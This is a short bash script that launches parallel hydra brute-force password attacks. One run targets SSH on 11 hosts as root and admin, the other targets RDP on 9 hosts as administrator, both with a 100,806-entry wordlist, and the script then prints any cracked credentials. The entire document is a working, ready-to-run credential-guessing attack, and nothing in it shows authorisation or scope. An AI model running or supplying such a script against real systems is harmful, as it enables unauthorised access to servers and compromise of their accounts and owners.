#!/bin/bash
set -e

echo "=== HYDRA BIG BRUTE FORCE ==="
echo "Started: $(date)"
echo ""

# Combined wordlist already at /tmp/big_combined.txt
echo "[*] Starting SSH hydra (11 hosts, users: root+admin, -t 4, 100806 passwords)..."
hydra -L /tmp/ssh_users.txt -P /tmp/big_combined.txt \
  -t 4 -o /tmp/hydra_ssh_big.txt -M /tmp/ssh_hosts.txt ssh \
  > /tmp/hydra_ssh_big.log 2>&1 &
SSH_PID=$!
echo "SSH PID: $SSH_PID"

echo "[*] Starting RDP hydra (9 hosts, user: administrator, -t 1, 100806 passwords)..."
hydra -l administrator -P /tmp/big_combined.txt \
  -t 1 -o /tmp/hydra_rdp_big.txt -M /tmp/rdp_hosts.txt rdp \
  > /tmp/hydra_rdp_big.log 2>&1 &
RDP_PID=$!
echo "RDP PID: $RDP_PID"

echo ""
echo "Waiting for both to complete..."
wait $SSH_PID
echo "SSH hydra finished at: $(date)"
wait $RDP_PID
echo "RDP hydra finished at: $(date)"

echo ""
echo "=== DONE ==="
echo "=== SSH RESULTS ==="
cat /tmp/hydra_ssh_big.txt 2>/dev/null || echo "(no results)"
echo ""
echo "=== RDP RESULTS ==="
cat /tmp/hydra_rdp_big.txt 2>/dev/null || echo "(no results)"
